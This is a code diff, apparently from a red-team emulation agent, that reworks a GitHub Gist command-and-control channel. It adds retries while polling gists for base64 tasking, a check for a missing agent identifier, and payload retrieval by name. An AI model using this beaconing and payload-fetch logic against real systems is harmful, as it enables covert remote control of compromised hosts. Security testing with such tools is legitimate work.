@@ -19,6 +19,8 @@ const (
 	githubTimeout = 60
 	githubTimeoutResetInterval = 5
 	githubError = 500
+	beaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon gist response before giving up.
+	beaconWait = 20 // number of seconds to wait for beacon gist response in case of initial failure.
 )
 
 var (
@@ -47,18 +49,22 @@ func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
 }
 
 //GetPayloadBytes load payload bytes from github
-func (g GIST) GetPayloadBytes(profile map[string]interface{}, payload string) []byte {
+func (g GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
 	var payloadBytes []byte
 	var err error
-	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payload))
+	if _, ok := profile["paw"]; !ok {
+		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
+		return nil, ""
+	}
+	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
 	if payloads[0] != "" {
 		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
 		if err != nil {
 			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
-			return nil
+			return nil, ""
 		}
 	}
-	return payloadBytes
+	return payloadBytes, payloadName
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
@@ -89,16 +95,25 @@ func (g GIST) GetName() string {
 
 
 func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
+	failCount := 0
 	heartbeat := createHeartbeatGist("beacon", profile)
-	//collect instructions & delete
-	contents := getGists("instructions", profile["paw"].(string))
-	if contents != nil {
-		decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
-		if err != nil {
-			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
-			return nil, heartbeat
+	if heartbeat {
+		//collect instructions & delete
+		for failCount < beaconResponseFailThreshold {
+			contents := getGists("instructions", profile["paw"].(string));
+			if contents != nil {
+				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
+				if err != nil {
+					output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
+					return nil, heartbeat
+				}
+				return decodedContents, heartbeat
+			}
+			// Wait for C2 server to provide instruction response gist.
+			time.Sleep(time.Duration(float64(beaconWait)) * time.Second)
+			failCount += 1
 		}
-		return decodedContents, heartbeat
+		output.VerbosePrint("[!] Failed to fetch beacon response from C2.")
 	}
 	return nil, heartbeat
 }
@@ -179,6 +194,7 @@ func checkValidSleepInterval(profile map[string]interface{}) {
 }
 
 func getBeaconNameIdentifier() string {
+	rand.Seed(time.Now().UnixNano())
 	return strconv.Itoa(rand.Int())
 }
 
